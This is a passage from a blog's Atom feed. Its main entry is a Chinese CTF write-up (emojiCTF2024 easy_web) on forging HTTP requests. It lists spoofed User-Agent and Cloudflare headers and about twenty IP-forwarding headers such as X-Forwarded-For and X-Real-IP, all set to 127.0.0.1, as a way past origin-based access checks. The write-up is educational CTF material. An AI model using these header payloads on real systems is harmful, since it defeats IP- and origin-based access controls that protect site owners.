    <summary type="html">&lt;h1 id=&quot;PHP原生类的利用&quot;&gt;&lt;a href=&quot;#PHP原生类的利用&quot; class=&quot;headerlink&quot; title=&quot;PHP原生类的利用&quot;&gt;&lt;/a&gt;PHP原生类的利用&lt;/h1&gt;&lt;h2 id=&quot;PHP内置类的遍历&quot;&gt;&lt;a href=&quot;#PHP内置类的遍历&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>http伪造</title>
    <link href="http://1768161086.github,io/2025/03/15/http%E4%BC%AA%E9%80%A0/"/>
    <id>http://1768161086.github,io/2025/03/15/http%E4%BC%AA%E9%80%A0/</id>
    <published>2025-03-15T01:59:36.000Z</published>
    <updated>2025-03-15T05:44:12.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-emojiCTF2024-easy-web"><a href="#1-emojiCTF2024-easy-web" class="headerlink" title="1.emojiCTF2024 easy_web"></a>1.emojiCTF2024 easy_web</h1><p>1.提示一： User-Agent:Baiduspide</p><p>2.抓包，修改UA</p><p>3.页面显示：欢迎来自垃圾百度的臭虫子！但是你爬不到什么了，因为本网站现在仅允许来自CloudFlare CDN的流量</p><p>查到以下网址：</p><p><a href="https://developers.cloudflare.com/fundamentals/reference/http-request-headers/">Cloudflare HTTP headers · Cloudflare Fundamentals docs</a></p><p>cf-connecting-ip: （这里填什么都行，表示流量来自 cf 网络）</p><p>cf-ipcountry: T1（表示来自洋葱网络）</p><h2 id="2-伪造代理："><a href="#2-伪造代理：" class="headerlink" title="2.伪造代理："></a>2.伪造代理：</h2><p>via:127.0.0.1</p><h2 id="3-伪造IP："><a href="#3-伪造IP：" class="headerlink" title="3.伪造IP："></a>3.伪造IP：</h2><p>X-Forwarded-For:127.0.0.1</p><p>X-Forwarded:127.0.0.1</p><p>Forwarded-For:127.0.0.1</p><p>Forwarded:127.0.0.1</p><p>X-Forwarded-Host:127.0.0.1</p><p>X-remote-IP:127.0.0.1</p><p>X-remote-addr:127.0.0.1</p><p>True-Client-IP:127.0.0.1</p><p>X-Client-IP:127.0.0.1</p><p>Client-IP:127.0.0.1</p><p>X-Real-IP:127.0.0.1</p><p>Ali-CDN-Real-IP:127.0.0.1</p><p>Cdn-Src-Ip:127.0.0.1</p><p>Cdn-Real-Ip:127.0.0.1</p><p>CF-Connecting-IP:127.0.0.1</p><p>X-Cluster-Client-IP:127.0.0.1</p><p>WL-Proxy-Client-IP:127.0.0.1</p><p>Proxy-Client-IP:127.0.0.1</p><p>Fastly-Client-Ip:127.0.0.1</p><p>True-Client-Ip:127.0.0.1</p><p>Host: 127.0.0.1</p><h2 id="4-伪造日期"><a href="#4-伪造日期" class="headerlink" title="4.伪造日期"></a>4.伪造日期</h2><p>Date: Tue, 27 Aug 2024 12:41:59 GMT</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-emojiCTF2024-easy-web&quot;&gt;&lt;a href=&quot;#1-emojiCTF2024-easy-web&quot; class=&quot;headerlink&quot; title=&quot;1.emojiCTF2024 easy_web&quot;&gt;&lt;/a&gt;1.emojiCTF2024 ea</summary>
      
    
    
    
    
  </entry>
  
</feed>
